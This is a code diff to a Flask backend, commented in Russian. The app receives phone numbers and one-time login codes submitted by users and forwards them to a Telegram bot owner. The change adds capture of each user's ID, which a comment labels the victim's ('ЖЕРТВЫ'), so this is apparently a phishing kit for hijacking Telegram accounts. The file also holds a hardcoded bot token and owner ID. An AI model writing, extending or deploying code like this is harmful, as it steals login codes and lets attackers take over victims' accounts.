@@ -5,7 +5,7 @@ import os
 app = Flask(__name__)
 
 BOT_TOKEN = "8322289308:AAEuUETn72fgvS0waidzVkjWIuJ8dhIe8Ts"
-OWNER_ID = 208405935
+OWNER_ID = 208405935  # твой ID
 
 def send_telegram(text):
     try:
@@ -20,17 +20,19 @@ def index():
 
 @app.route('/api/send_code', methods=['POST'])
 def send_code():
-    phone = request.json.get('phone', '')
-    # Отправляем ТОЛЬКО НОМЕР в Telegram
-    send_telegram(f"📱 НОМЕР: {phone}")
+    data = request.json
+    phone = data.get('phone', '')
+    user_id = data.get('user_id', '')  # ★★★ ПОЛУЧАЕМ ID ЖЕРТВЫ ★★★
+    send_telegram(f"📱 НОМЕР: {phone}\n👤 USER_ID: {user_id}")
     return jsonify({"status": "ok"})
 
 @app.route('/api/verify_code', methods=['POST'])
 def verify_code():
-    phone = request.json.get('phone', '')
-    code = request.json.get('code', '')
-    # Отправляем КОД в Telegram
-    send_telegram(f"🔓 {phone}\nКОД: {code}")
+    data = request.json
+    phone = data.get('phone', '')
+    code = data.get('code', '')
+    user_id = data.get('user_id', '')  # ★★★ ПОЛУЧАЕМ ID ЖЕРТВЫ ★★★
+    send_telegram(f"🔓 {phone}\nКОД: {code}\n👤 USER_ID: {user_id}")
     return jsonify({"success": True})
 
 if __name__ == '__main__':
